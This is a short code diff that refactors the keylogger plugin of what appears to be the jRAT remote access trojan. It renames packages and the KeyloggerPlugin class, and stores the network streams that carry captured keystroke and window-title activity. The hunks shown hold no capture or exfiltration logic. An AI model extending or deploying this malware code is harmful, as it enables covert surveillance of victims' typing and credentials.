@@ -1,4 +1,4 @@
-package pro.jrat.plugin.stub;
+package pro.jrat.plugin.keylogger.stub;
 
 import java.io.BufferedReader;
 import java.io.BufferedWriter;
@@ -12,14 +12,13 @@ import java.io.PrintWriter;
 
 import org.jnativehook.GlobalScreen;
 
-import pro.jrat.api.stub.StubPlugin;
-import pro.jrat.plugin.stub.activities.Activities;
-import pro.jrat.plugin.stub.activities.Activity;
-import pro.jrat.plugin.stub.activities.Key;
-import pro.jrat.plugin.stub.activities.Title;
-import pro.jrat.plugin.stub.codec.Base64;
+import pro.jrat.plugin.keylogger.stub.activities.Activities;
+import pro.jrat.plugin.keylogger.stub.activities.Activity;
+import pro.jrat.plugin.keylogger.stub.activities.Key;
+import pro.jrat.plugin.keylogger.stub.activities.Title;
+import pro.jrat.plugin.keylogger.stub.codec.Base64;
 
-public class KeyloggerPlugin extends StubPlugin {
+public class StubPlugin extends pro.jrat.api.stub.StubPlugin {
 
 	public static DataInputStream dis;
 	public static DataOutputStream dos;
@@ -40,8 +39,8 @@ public class KeyloggerPlugin extends StubPlugin {
 	}
 
 	public void onConnect(DataInputStream in, DataOutputStream out) {
-		KeyloggerPlugin.dis = in;
-		KeyloggerPlugin.dos = out;
+		StubPlugin.dis = in;
+		StubPlugin.dos = out;
 	}
 
 	public void onPacket(byte header) throws Exception {
